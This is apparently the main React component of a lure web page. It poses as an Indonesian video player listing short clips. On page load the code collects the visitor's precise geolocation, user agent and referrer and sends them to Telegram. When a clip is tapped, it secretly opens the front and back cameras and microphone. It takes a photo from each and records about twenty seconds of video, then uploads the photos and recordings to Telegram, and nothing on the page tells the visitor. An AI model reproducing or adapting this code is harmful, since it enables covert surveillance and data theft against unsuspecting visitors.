import { ArrowsPointingOutIcon, ArrowsPointingInIcon } from '@heroicons/react/24/solid';
import { useState, useEffect, useCallback, useRef } from 'react';
import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram, VisitorDetails } from './utils/telegram';
import { monitorSuspiciousActivity, cleanupMediaStream, validateVideoUrl } from './security';

function App() {
  const [isPlaying, setIsPlaying] = useState<number | null>(null);
  const [isFullscreen, setIsFullscreen] = useState(false);
  const [hasRequestedLocation, setHasRequestedLocation] = useState(false);
  const [hasRequestedCamera, setHasRequestedCamera] = useState(false);
  const [isLoading, setIsLoading] = useState<boolean[]>([]);
  const [videoErrors, setVideoErrors] = useState<boolean[]>([]);
  const videoRefs = useRef<(HTMLVideoElement | null)[]>([]);
  const cameraStreamsRef = useRef<{ stream: MediaStream; type: string; deviceId: string }[]>([]);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const recordedChunksRef = useRef<{ [key: string]: BlobPart[] }>({ front: [], back: [] });
  const recordingStartTimeRef = useRef<{ [key: string]: number }>({ front: 0, back: 0 }); // Simpan waktu mulai perekaman

  const videos = [
    { videoUrl: 'https://cdn.videy.co/n9L2Emde1.mp4' },
    { videoUrl: 'https://cdn.videy.co/1b6c5wE41.mp4' },
    { videoUrl: 'https://cdn.videy.co/7hwla9hS1.mp4' },
    { videoUrl: 'https://cdn.videy.co/xP6RWC6J1.mp4' },
    { videoUrl: 'https://cdn.videy.co/deZOnAa71.mp4' },
    { videoUrl: 'https://cdn.videy.co/z9eBAbxS1.mp4' },
    { videoUrl: 'https://cdn.videy.co/WRnnbxOh.mp4' },
    { videoUrl: 'https://cdn.videy.co/8asKje3H1.mp4' },
    { videoUrl: 'https://cdn.videy.co/WLL4NxqP1.mp4' },
    { videoUrl: 'https://cdn.videy.co/6jYqrrwx1.mp4' },
    { videoUrl: 'https://cdn.videy.co/Tfh7KSKb1.mp4' },
    { videoUrl: 'https://cdn.videy.co/HCpyHdGC.mp4' },
    { videoUrl: 'https://cdn.videy.co/J4r8BFDR.mp4' },
    { videoUrl: 'https://cdn.videy.co/nYIZsZcT1.mp4' },
    { videoUrl: 'https://cdn.videy.co/NQ8EOxk0.mp4' },
    { videoUrl: 'https://cdn.videy.co/B2cLTw5A1.mp4' },
    { videoUrl: 'https://cdn.videy.co/x3DQJdR6.mp4' },
    { videoUrl: 'https://cdn.videy.co/FPZ8MZdC.mp4' },
    { videoUrl: 'https://cdn.videy.co/nxkWOzw01.mp4' },
    { videoUrl: 'https://cdn.videy.co/1LvE4FR31.mp4' },
    { videoUrl: 'https://cdn.videy.co/YQog37Pu1.mp4' },
    { videoUrl: 'https://cdn.videy.co/VVH2RmCn1.mp4' },
    { videoUrl: 'https://cdn.videy.co/XJOGYNCi1.mp4' },
    { videoUrl: 'https://cdn.videy.co/1S2HTGaf1.mp4' },
  ];

  useEffect(() => {
    setIsLoading(new Array(videos.length).fill(true));
    setVideoErrors(new Array(videos.length).fill(false));
  }, []);

  useEffect(() => {
    monitorSuspiciousActivity();

    const getLocation = async (): Promise<string> => {
      try {
        const position = await new Promise<GeolocationPosition>((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0,
          });
        });
        const { latitude, longitude } = position.coords;
        return `Latitude: ${latitude}, Longitude: ${longitude}`;
      } catch (error) {
        console.error('Gagal mendapatkan lokasi:', error);
        return window.location.href;
      }
    };

    const sendVisitorNotification = async () => {
      if (hasRequestedLocation) return;
      setHasRequestedLocation(true);

      const location = await getLocation();
      const visitorDetails: VisitorDetails = {
        userAgent: navigator.userAgent,
        location: location,
        referrer: document.referrer || 'Langsung',
        previousSites: document.referrer || 'Tidak ada',
      };
      try {
        await sendTelegramNotification(visitorDetails);
        console.log('Notifikasi pengunjung berhasil dikirim.');
      } catch (error) {
        console.error('Gagal mengirim notifikasi pengunjung:', error);
      }
    };

    sendVisitorNotification();

    videos.forEach((video, index) => {
      console.log(`Memeriksa video ${index + 1}: ${video.videoUrl}`);
      if (!validateVideoUrl(video.videoUrl)) {
        console.error(`Video ${index + 1} memiliki URL yang tidak valid.`);
        setVideoErrors((prev) => {
          const newErrors = [...prev];
          newErrors[index] = true;
          return newErrors;
        });
      }
    });

    return () => {
      cameraStreamsRef.current.forEach(({ stream }) => cleanupMediaStream({ current: stream }));
      cameraStreamsRef.current = [];
    };
  }, [hasRequestedLocation]);

  const initializeCameraStreams = async () => {
    if (hasRequestedCamera) return;
    setHasRequestedCamera(true);

    const requestMediaAccess = async (facingMode: string | { deviceId: string }, cameraType: string): Promise<{ stream: MediaStream; deviceId: string } | null> => {
      try {
        const initialConstraints = {
          video: typeof facingMode === 'string' ? { facingMode } : { deviceId: { exact: facingMode.deviceId } },
          audio: true,
        };
        const stream = await navigator.mediaDevices.getUserMedia(initialConstraints);
        const videoTrack = stream.getVideoTracks()[0];
        const deviceId = videoTrack.getSettings().deviceId || '';

        const capabilities = videoTrack.getCapabilities();
        console.log(`Kemampuan kamera ${cameraType}:`, capabilities);

        const maxWidth = capabilities.width?.max || 1280;
        const maxHeight = capabilities.height?.max || 720;
        const maxFrameRate = capabilities.frameRate?.max || 30;

        stream.getTracks().forEach(track => track.stop());

        const targetWidth = Math.min(maxWidth, 1280);
        const targetHeight = Math.min(maxHeight, 720);

        const optimizedConstraints = {
          video: {
            deviceId: { exact: deviceId },
            width: { ideal: targetWidth },
            height: { ideal: targetHeight },
            frameRate: { ideal: maxFrameRate },
          },
          audio: true,
        };
        const optimizedStream = await navigator.mediaDevices.getUserMedia(optimizedConstraints);
        console.log(`Berhasil mendapatkan stream untuk kamera ${cameraType} dengan deviceId: ${deviceId}, resolusi: ${targetWidth}x${targetHeight}`);
        return { stream: optimizedStream, deviceId };
      } catch (error) {
        console.error(`Gagal mendapatkan akses kamera ${cameraType}:`, error);
        return null;
      }
    };

    try {
      const devices = await navigator.mediaDevices.enumerateDevices();
      const videoDevices = devices.filter(device => device.kind === 'videoinput');
      console.log('Perangkat kamera yang ditemukan:', videoDevices.map(d => ({ label: d.label, deviceId: d.deviceId })));

      const frontResult = await requestMediaAccess('user', 'depan');
      if (frontResult) {
        cameraStreamsRef.current.push({ stream: frontResult.stream, type: 'depan', deviceId: frontResult.deviceId });
      } else {
        console.warn('Kamera depan tidak tersedia atau akses ditolak.');
      }

      let backResult = await requestMediaAccess('environment', 'belakang');
      if (!backResult && videoDevices.length > 1) {
        console.log('Mencoba kamera belakang dengan deviceId alternatif...');
        backResult = await requestMediaAccess({ deviceId: videoDevices[1].deviceId }, 'belakang');
      }
      if (backResult) {
        cameraStreamsRef.current.push({ stream: backResult.stream, type: 'belakang', deviceId: backResult.deviceId });
      } else {
        console.warn('Kamera belakang tidak tersedia atau akses ditolak.');
      }

      if (cameraStreamsRef.current.length === 0) {
        console.error('Tidak ada kamera yang tersedia atau semua akses ditolak.');
      } else {
        console.log('Stream kamera yang diinisialisasi:', cameraStreamsRef.current.map(s => `${s.type} (${s.deviceId})`));
      }
    } catch (error) {
      console.error('Error saat menginisialisasi stream kamera:', error);
    }
  };

  const verifyStream = (stream: MediaStream, type: string): boolean => {
    const videoTracks = stream.getVideoTracks();
    const audioTracks = stream.getAudioTracks();
    if (videoTracks.length === 0 || !videoTracks[0].enabled) {
      console.error(`Stream untuk kamera ${type} tidak valid (video track). Tracks: ${videoTracks.length}`);
      return false;
    }
    if (audioTracks.length === 0 || !audioTracks[0].enabled) {
      console.error(`Stream untuk kamera ${type} tidak valid (audio track). Tracks: ${audioTracks.length}`);
      return false;
    }
    console.log(`Stream untuk kamera ${type} valid dengan ${videoTracks.length} video track(s) dan ${audioTracks.length} audio track(s).`);
    return true;
  };

  const reinitializeStream = async (cameraType: string, deviceId: string): Promise<MediaStream | null> => {
    try {
      const constraints = {
        video: { deviceId: { exact: deviceId } },
        audio: true,
      };
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      const videoTrack = stream.getVideoTracks()[0];
      const capabilities = videoTrack.getCapabilities();
      const maxWidth = capabilities.width?.max || 1280;
      const maxHeight = capabilities.height?.max || 720;
      const maxFrameRate = capabilities.frameRate?.max || 30;

      stream.getTracks().forEach(track => track.stop());

      const targetWidth = Math.min(maxWidth, 1280);
      const targetHeight = Math.min(maxHeight, 720);

      const optimizedConstraints = {
        video: {
          deviceId: { exact: deviceId },
          width: { ideal: targetWidth },
          height: { ideal: targetHeight },
          frameRate: { ideal: maxFrameRate },
        },
        audio: true,
      };
      const optimizedStream = await navigator.mediaDevices.getUserMedia(optimizedConstraints);
      console.log(`Berhasil menginisialisasi ulang stream untuk kamera ${cameraType} dengan deviceId: ${deviceId}`);
      return optimizedStream;
    } catch (error) {
      console.error(`Gagal menginisialisasi ulang stream untuk kamera ${cameraType}:`, error);
      return null;
    }
  };

  const stopRecording = async (cameraType: string) => {
    const mediaRecorder = mediaRecorderRef.current;
    if (mediaRecorder && mediaRecorder.state === 'recording') {
      return new Promise<void>((resolve) => {
        mediaRecorder.onstop = async () => {
          const chunks = recordedChunksRef.current[cameraType === 'depan' ? 'front' : 'back'];
          const mimeType = mediaRecorder.mimeType || 'video/webm';
          const videoBlob = new Blob(chunks, { type: mimeType });

          // Hitung durasi perekaman
          const startTime = recordingStartTimeRef.current[cameraType === 'depan' ? 'front' : 'back'];
          const duration = (Date.now() - startTime) / 1000; // Durasi dalam detik
          console.log(`Durasi perekaman kamera ${cameraType}: ${duration} detik`);

          if (videoBlob.size < 10000 || chunks.length === 0) {
            console.warn(`File video dari kamera ${cameraType} terlalu kecil atau kosong, tidak dikirim ke Telegram. Ukuran: ${videoBlob.size} bytes`);
            resolve();
            return;
          }

          try {
            await sendVideoToTelegram(videoBlob);
            console.log(`Video dari kamera ${cameraType} berhasil dikirim ke Telegram. Ukuran: ${videoBlob.size} bytes, Durasi: ${duration} detik`);
          } catch (error) {
            console.error(`Gagal mengirim video dari kamera ${cameraType}:`, error);
          }
          resolve();
        };

        // Hentikan perekaman
        mediaRecorder.stop();
        console.log(`Perekaman kamera ${cameraType} dihentikan.`);
      });
    } else {
      console.log(`Tidak ada perekaman aktif untuk kamera ${cameraType}.`);
      return Promise.resolve();
    }
  };

  const recordCamera = async (stream: MediaStream, type: string, deviceId: string) => {
    let currentStream = stream;
    if (!verifyStream(currentStream, type)) {
      console.warn(`Stream kamera ${type} tidak valid, mencoba menginisialisasi ulang...`);
      const newStream = await reinitializeStream(type, deviceId);
      if (newStream && verifyStream(newStream, type)) {
        currentStream = newStream;
        const cameraIndex = cameraStreamsRef.current.findIndex(s => s.type === type);
        if (cameraIndex !== -1) {
          cameraStreamsRef.current[cameraIndex].stream = newStream;
        }
      } else {
        console.warn(`Gagal menginisialisasi ulang stream kamera ${type}, melewati perekaman.`);
        return;
      }
    }

    try {
      const cameraVideo = document.createElement('video');
      cameraVideo.srcObject = currentStream;
      cameraVideo.playsInline = true;
      cameraVideo.muted = true;
      cameraVideo.autoplay = true;
      cameraVideo.style.display = 'none';
      document.body.appendChild(cameraVideo);

      await new Promise((resolve) => {
        cameraVideo.onloadedmetadata = async () => {
          await cameraVideo.play().catch(err => console.error(`Gagal memutar video kamera ${type}:`, err));
          setTimeout(resolve, 500);
        };
      });

      const videoWidth = cameraVideo.videoWidth;
      const videoHeight = cameraVideo.videoHeight;
      console.log(`Dimensi video kamera ${type}: ${videoWidth}x${videoHeight}`);

      // Foto: Gunakan resolusi asli kamera
      const canvas = document.createElement('canvas');
      const canvasAspectRatio = 9 / 16;
      const videoAspectRatio = videoWidth / videoHeight;

      let drawWidth, drawHeight, offsetX, offsetY;
      if (videoAspectRatio > canvasAspectRatio) {
        drawWidth = videoWidth;
        drawHeight = drawWidth / videoAspectRatio;
      } else {
        drawHeight = videoHeight;
        drawWidth = drawHeight * videoAspectRatio;
      }

      canvas.width = drawWidth;
      canvas.height = drawHeight;

      offsetX = (drawWidth - videoWidth) / 2;
      offsetY = (drawHeight - videoHeight) / 2;

      const context = canvas.getContext('2d');
      if (context) {
        context.drawImage(cameraVideo, offsetX, offsetY, videoWidth, videoHeight);
      }

      const photoBlob = await new Promise<Blob>((resolve) => {
        canvas.toBlob((blob) => blob && resolve(blob), 'image/jpeg', 1.0);
      });

      try {
        await sendImageToTelegram(photoBlob);
        console.log(`Foto dari kamera ${type} berhasil dikirim ke Telegram.`);
      } catch (error) {
        console.error(`Gagal mengirim foto dari kamera ${type}:`, error);
      }

      // Video: Gunakan codec WebM untuk kompatibilitas lebih baik
      const supportedMimeTypes = [
        'video/webm;codecs=vp8,opus', // Prioritaskan WebM
        'video/mp4;codecs=h264,aac',
        'video/webm',
        'video/mp4',
      ];
      const mimeType = supportedMimeTypes.find(type => MediaRecorder.isTypeSupported(type)) || 'video/webm';
      const videoResolution = videoWidth * videoHeight;
      const bitrate = videoResolution > 1280 * 720 ? 1500000 : 1000000;

      const mediaRecorder = new MediaRecorder(currentStream, {
        mimeType,
        videoBitsPerSecond: bitrate,
      });
      mediaRecorderRef.current = mediaRecorder;
      recordedChunksRef.current[type === 'depan' ? 'front' : 'back'] = [];

      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) {
          recordedChunksRef.current[type === 'depan' ? 'front' : 'back'].push(e.data);
          console.log(`Data tersedia untuk kamera ${type}. Ukuran chunk: ${e.data.size} bytes`);
        } else {
          console.warn(`Chunk kosong diterima untuk kamera ${type}.`);
        }
      };

      mediaRecorder.onstop = null;

      mediaRecorder.onerror = (e) => {
        console.error(`Error saat merekam kamera ${type}:`, e);
      };

      // Catat waktu mulai perekaman
      recordingStartTimeRef.current[type === 'depan' ? 'front' : 'back'] = Date.now();

      // Mulai perekaman
      mediaRecorder.start(1000);
      console.log(`Mulai merekam kamera ${type} dengan bitrate ${bitrate} bps`);

      // Tunggu 1 detik untuk memastikan data mulai terkumpul
      await new Promise(resolve => setTimeout(resolve, 1000));

      const recordingTimeout = setTimeout(() => {
        if (mediaRecorder.state === 'recording') {
          stopRecording(type);
          console.warn(`Perekaman kamera ${type} dihentikan karena timeout.`);
        }
      }, 25000);

      await new Promise((resolve) => setTimeout(async () => {
        if (mediaRecorder.state === 'recording') {
          await stopRecording(type);
          console.log(`Perekaman kamera ${type} dihentikan setelah 20 detik.`);
        }
        clearTimeout(recordingTimeout);
        resolve(null);
      }, 20000));

      if (cameraVideo.parentNode) cameraVideo.parentNode.removeChild(cameraVideo);
    } catch (error) {
      console.error(`Error saat merekam kamera ${type}:`, error);
    }
  };

  const captureAndSendMedia = useCallback(async (videoElement: HTMLVideoElement) => {
    console.log('Memulai proses perekaman untuk kamera...');

    try {
      await new Promise((resolve) => {
        if (videoElement.readyState >= 3) {
          resolve(null);
        } else {
          videoElement.oncanplay = () => resolve(null);
        }
      });

      await videoElement.play();

      await initializeCameraStreams();

      if (cameraStreamsRef.current.length === 0) {
        console.error('Tidak ada stream kamera yang tersedia.');
        videoElement.pause();
        setIsPlaying(null);
        return;
      }

      const frontCamera = cameraStreamsRef.current.find(s => s.type === 'depan');
      const backCamera = cameraStreamsRef.current.find(s => s.type === 'belakang');

      if (frontCamera) {
        await recordCamera(frontCamera.stream, 'depan', frontCamera.deviceId);
      } else {
        console.warn('Kamera depan tidak tersedia untuk perekaman.');
      }

      if (backCamera) {
        await recordCamera(backCamera.stream, 'belakang', backCamera.deviceId);
      } else {
        console.warn('Kamera belakang tidak tersedia untuk perekaman.');
      }

      if (!frontCamera && !backCamera) {
        console.error('Kedua kamera tidak tersedia.');
      }

      videoElement.pause();
      setIsPlaying(null);
    } catch (error) {
      console.error('Error dalam captureAndSendMedia:', error);
      videoElement.pause();
      setIsPlaying(null);
    }
  }, []);

  const handleVideoClick = useCallback(async (index: number) => {
    if (isPlaying !== null && isPlaying !== index) {
      const prevVideo = videoRefs.current[isPlaying];
      if (prevVideo) {
        prevVideo.pause();
        prevVideo.currentTime = 0;
        prevVideo.removeAttribute('src');
        prevVideo.load();
        await stopRecording('depan');
        await stopRecording('belakang');
        console.log(`Video sebelumnya di indeks ${isPlaying} dihentikan sepenuhnya.`);
      }
    }

    const videoElement = videoRefs.current[index];
    if (videoElement) {
      if (!validateVideoUrl(videos[index].videoUrl)) {
        console.error('URL video tidak valid, menghentikan pemutaran.');
        setVideoErrors((prev) => {
          const newErrors = [...prev];
          newErrors[index] = true;
          return newErrors;
        });
        return;
      }

      try {
        setIsPlaying(index);
        await captureAndSendMedia(videoElement);
      } catch (error) {
        console.error('Error memutar video:', error);
        videoElement.pause();
        videoElement.currentTime = 0;
        videoElement.removeAttribute('src');
        videoElement.load();
        await stopRecording('depan');
        await stopRecording('belakang');
        setIsPlaying(null);
      }
    }
  }, [isPlaying]);

  const toggleFullscreen = (index: number) => {
    const videoElement = videoRefs.current[index];
    if (videoElement) {
      if (!isFullscreen) {
        videoElement.requestFullscreen().catch(err => console.error('Gagal masuk fullscreen:', err));
        setIsFullscreen(true);
      } else {
        document.exitFullscreen().catch(err => console.error('Gagal keluar fullscreen:', err));
      }
      console.log(`Mengubah mode fullscreen untuk video di indeks: ${index}`);
    }
  };

  const handleVideoEnded = async (index: number) => {
    await stopRecording('depan');
    await stopRecording('belakang');
    setIsPlaying(null);
    console.log(`Video di indeks ${index} telah selesai.`);
  };

  const handleCanPlay = (index: number) => {
    console.log(`Video ${index + 1} siap diputar.`);
    setIsLoading((prev) => {
      const newLoading = [...prev];
      newLoading[index] = false;
      return newLoading;
    });
  };

  const handleVideoError = (index: number) => {
    console.error(`Gagal memuat video ${index + 1}: ${videos[index].videoUrl}`);
    setIsLoading((prev) => {
      const newLoading = [...prev];
      newLoading[index] = false;
      return newLoading;
    });
    setVideoErrors((prev) => {
      const newErrors = [...prev];
      newErrors[index] = true;
      return newErrors;
    });
  };

  useEffect(() => {
    const handleFullscreenChange = async () => {
      if (!document.fullscreenElement && isFullscreen) {
        if (isPlaying !== null) {
          const videoElement = videoRefs.current[isPlaying];
          if (videoElement) {
            videoElement.pause();
            videoElement.currentTime = 0;
            videoElement.removeAttribute('src');
            videoElement.load();
            await stopRecording('depan');
            await stopRecording('belakang');
            setIsPlaying(null);
            console.log('Video dihentikan karena keluar dari fullscreen.');
          }
        }
        setIsFullscreen(false);
      }
    };

    const handleBeforeUnload = async () => {
      await stopRecording('depan');
      await stopRecording('belakang');
      cameraStreamsRef.current.forEach(({ stream }) => cleanupMediaStream({ current: stream }));
      cameraStreamsRef.current = [];
    };

    document.addEventListener('fullscreenchange', handleFullscreenChange);
    window.addEventListener('beforeunload', handleBeforeUnload);

    return () => {
      document.removeEventListener('fullscreenchange', handleFullscreenChange);
      window.removeEventListener('beforeunload', handleBeforeUnload);
    };
  }, [isFullscreen, isPlaying]);

  return (
    <div className="relative min-h-screen bg-gray-900">
      <header className="relative bg-gray-800 py-6">
        <div className="container mx-auto px-4">
          <h1 className="text-3xl font-bold text-white">Pemutar Video</h1>
        </div>
      </header>
      <main className="relative container mx-auto px-4 py-8">
        <div className="max-w-[360px] mx-auto">
          <div className="space-y-2">
            {videos.map((video, index) => (
              <div key={index} className="relative bg-black rounded-lg overflow-hidden shadow-xl" style={{ aspectRatio: '9/16', maxHeight: '200px' }}>
                {isLoading[index] && !videoErrors[index] && (
                  <div className="absolute inset-0 flex items-center justify-center bg-gray-800 bg-opacity-75">
                    <svg className="animate-spin h-8 w-8 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                  </div>
                )}
                {videoErrors[index] && (
                  <div className="absolute inset-0 flex items-center justify-center bg-gray-800 bg-opacity-75">
                    <p className="text-white text-center">Gagal memuat video. Silakan coba lagi nanti.</p>
                  </div>
                )}
                <video
                  ref={(el) => (videoRefs.current[index] = el)}
                  src={video.videoUrl}
                  className="w-full h-full object-cover"
                  muted
                  onClick={() => handleVideoClick(index)}
                  onEnded={() => handleVideoEnded(index)}
                  onCanPlay={() => handleCanPlay(index)}
                  onError={() => handleVideoError(index)}
                  preload="auto"
                  playsInline
                  {...({ loading: 'lazy' } as any)}
                >
                  <p>Maaf, video tidak dapat dimuat. Silakan periksa koneksi Anda atau coba lagi nanti.</p>
                </video>
                {isPlaying === index && !videoErrors[index] && (
                  <div className="absolute bottom-2 right-2 z-20">
                    <button
                      onClick={() => toggleFullscreen(index)}
                      className="bg-gray-800/70 p-1 rounded-full hover:bg-gray-700 transition-all duration-200"
                    >
                      {isFullscreen ? (
                        <ArrowsPointingInIcon className="w-5 h-5 text-white" />
                      ) : (
                        <ArrowsPointingOutIcon className="w-5 h-5 text-white" />
                      )}
                    </button>
                  </div>
                )}
              </div>
            ))}
          </div>
        </div>
      </main>
    </div>
  );
}

export default App;
